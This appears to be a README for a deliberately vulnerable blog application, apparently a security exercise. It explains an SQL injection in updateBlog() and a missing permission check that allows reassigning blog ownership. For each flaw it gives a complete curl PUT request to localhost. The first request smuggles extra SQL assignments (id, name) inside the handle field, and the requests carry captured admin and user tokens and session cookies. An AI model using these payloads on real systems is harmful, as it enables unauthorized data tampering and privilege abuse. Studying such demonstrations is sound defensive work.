# Overview

This code base demonstrates the following attacks: ....

# Vulnerability 1: SQL Injection Attack

The code includes an SQL injection attack that allows an attacker to inject arbitrary
commands into the Blog Database. The vulnerable codepath is as follows:

1. HTTP requests sent to the BlogResource's updateBlog() method accepts a "blog" parameter
   on lines 84-119
2. The elements of the Blog are concatenated to form SQL Queries
3. Creative setup of either the Handle string or the Name String can allow a hacker to set parameters they have no business changing, like the unique ID in the database

The vulnerability can be exploited by following the steps below:

1. Create a Blog entity (Curl setup as Admin)
2. Using curl, send the following request to the server:
   (The ID Value in the JSON will need to match the Blog you wish to change)

curl 'http://localhost:8080/api/blogs' -X PUT -H 'Sec-Fetch-Mode: cors' -H 'Origin: http://localhost:8080' -H 'X-XSRF-TOKEN: 70785733-d570-48e0-8aaf-84def302ca70' -H 'Accept-Language: en-US,en;q=0.9' -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTU3MTcyNjM2OX0.3ZVSufjAGZkIzhRwbF6je4Ol6LPOoTB40OIzkLdXWE5xvDme4FoxyYlgLy0nEr2ZcO8XG8sp1CTQf0X4rrDBhA' -H 'Accept-Encoding: gzip, deflate, br' -H 'Cookie: XSRF-TOKEN=70785733-d570-48e0-8aaf-84def302ca70; JSESSIONID=sbJFD3rLekadRFxvmreQXAF2zplu9e8BGBNEGVJU; io=COdBC5irez3F1xjVAAAG' -H 'Connection: keep-alive' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36' -H 'Content-Type: application/json' -H 'Accept: application/json, text/plain, _/_' -H 'Referer: http://localhost:8080/blog/5851/edit' -H 'Sec-Fetch-Site: same-origin' -H 'DNT: 1' --data-binary \$'{"id":5851,"name":"aaaaaaaaaaaaaaaaaaa","handle":"I changed Three things\u0021\', id = 5853, name=\'hehehehehe","user":{"id":3,"login":"admin","firstName":"Administrator","lastName":"Administrator","email":"admin@localhost","activated":true,"langKey":"en","imageUrl":"","resetDate":null}}' --compressed

3. The Server will send back the JSON of the updated blog

# Vulnerability 2: Injection Attack

The code includes an injection attack that allows an attacker to inject arbitrary
commands into the Blog Database. The vulnerable codepath is as follows:

1. HTTP requests sent to the BlogResource's updateBlog() method accepts a "blog" parameter
   on lines 84-119
2. The user data to be set is not checked for permissions
3. This allows for any user to reassign the the owner of a blog to another user
4. This can not be done through the web page itself as it does not allow you to assign things to other users, therefore this is an easily misable mistake if you don't test around the UI

The vulnerability can be exploited by following the steps below:

1. Create a Blog entity as User
2. Using curl, send the following request to the server:
   (The ID Value in the JSON will need to match the Blog you wish to change to be owned by the admin)

curl 'http://localhost:8080/api/blogs' -X PUT -H 'Sec-Fetch-Mode: cors' -H 'Origin: http://localhost:8080' -H 'X-XSRF-TOKEN: 70785733-d570-48e0-8aaf-84def302ca70' -H 'Accept-Language: en-US,en;q=0.9' -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ1c2VyIiwiYXV0aCI6IlJPTEVfVVNFUiIsImV4cCI6MTU3MTc3OTc1OX0.qlCXpXGVLyGZpEN7PGSpo2FdbuRDqMcWhYc796YoUOi*l2cmauo77xoa56fQA2GYVGMq-v-Cjqps4FUbxGGpYw' -H 'Accept-Encoding: gzip, deflate, br' -H 'Cookie: XSRF-TOKEN=70785733-d570-48e0-8aaf-84def302ca70; JSESSIONID=sbJFD3rLekadRFxvmreQXAF2zplu9e8BGBNEGVJU; io=COdBC5irez3F1xjVAAAG' -H 'Connection: keep-alive' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36' -H 'Content-Type: application/json' -H 'Accept: application/json, text/plain, */\_' -H 'Referer: http://localhost:8080/blog/5852/edit' -H 'Sec-Fetch-Site: same-origin' -H 'DNT: 1' --data-binary '{"id":5852,"name":"TESTed","handle":"TESTed","user":{"id":3,"login":"admin","firstName":"Administrator","lastName":"Administrator","email":"admin@localhost","activated":true,"langKey":"en","imageUrl":"","resetDate":null}}' --compressed

3. The Server will send back the JSON of the updated blog
